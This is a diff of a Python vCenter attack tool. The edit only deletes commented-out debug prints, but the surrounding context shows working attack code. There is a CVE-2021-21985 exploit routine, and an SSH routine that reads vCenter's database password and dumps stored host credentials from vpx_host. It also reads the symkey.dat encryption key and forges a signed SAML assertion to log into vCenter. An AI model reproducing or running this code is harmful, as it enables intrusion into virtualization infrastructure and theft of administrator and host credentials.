@@ -160,7 +160,7 @@ def cve2021_21985(config):
     fp = BytesIO()
     with ZipFile(fp, 'w', ZIP_DEFLATED) as f:
         f.writestr(arcname, context)
-    # print()
+    
 
     with Session() as s:
         s.verify = False
@@ -345,13 +345,13 @@ def psql_query(config):
     client.connect(host, username=username, password=passwd)
     _stdin, _stdout, _stderr = client.exec_command(f"shell cat {config_file}")
     conf = [v.split('=', 1) for v in _stdout.read().decode().split('\n')]
-    # print(conf)
+    
     vc_password = ''
     for it in conf:
         if it[0].strip() == 'password':
             vc_password = it[1].strip().replace('<', '\\\\<').replace('>', '\\\\>')
     assert vc_password is not None
-    # print(vc_password)
+    
     client.connect(host, username=username, password=passwd)
     cmd = "shell export PGPASSWORD='" + vc_password + "'&&psql --username=vc -d VCDB -c 'select ip_address,user_name," \
                                                       "password from vpx_host;' "
@@ -361,7 +361,7 @@ def psql_query(config):
     print(_stdout.read().decode())
     # [print(std.read().decode()) for std in ( _stdout, _stderr)]
     # _stdin.write(b'whoami')
-    # print(_stdin.read())
+    
     print('[+] psql测试完成')
     exit(0)
 
@@ -370,7 +370,7 @@ def psql_query(config):
     # 解析IP username enc_passwd
     config_list = [l.split('|') for l in out_str if '|' in l]
     ip_user_pass = [(v[0].strip(), v[1].strip(), v[2].strip()[1:]) for v in config_list[1:]]
-    # print(ip_user_pass)
+    
 
     cmd = 'shell cat /etc/vmware-vpx/ssl/symkey.dat'
     client.connect(host, username=username, password=passwd)
@@ -443,7 +443,7 @@ def saml_login(config):
                 relay_state = relay_state[0]
             dec = base64.decodebytes(sr.encode("utf-8"))
             req = zlib.decompress(dec, -8)
-            # print(req.decode())
+            
             return etree.fromstring(req), domain, relay_state
         except:
             print(f'[-] Failed initiating SAML request with {vcenter}')
@@ -510,9 +510,9 @@ def saml_login(config):
               </saml2:Assertion>
             </saml2p:Response>
             """
-        # print(before, after)
+        
         try:
-            # print(req.get("ID"))
+            
             response = response_template.replace("$VCENTER_IP", vcenter_ip). \
                 replace("$VCENTER", vcenter_hostname). \
                 replace("$DOMAIN", vcenter_domain). \
@@ -542,7 +542,7 @@ def saml_login(config):
                 "utf-8").rstrip() + "\n-----END PRIVATE KEY----- "
             certs = ["-----BEGIN CERTIFICATE-----\n" + base64.encodebytes(data).decode(
                 "utf-8").rstrip() + "\n-----END CERTIFICATE-----" for data in certs_byte]
-            # print(key)
+            
             return key, certs
         except Exception as e:
             print(f'{e}')
@@ -572,7 +572,7 @@ def saml_login(config):
         try:
             print('[*] Attempting to log into vCenter with the signed SAML request')
             resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
-            # print(resp)
+            
             r = requests.post(
                 f"https://{vcenter}/ui/saml/websso/sso",
                 allow_redirects=False,
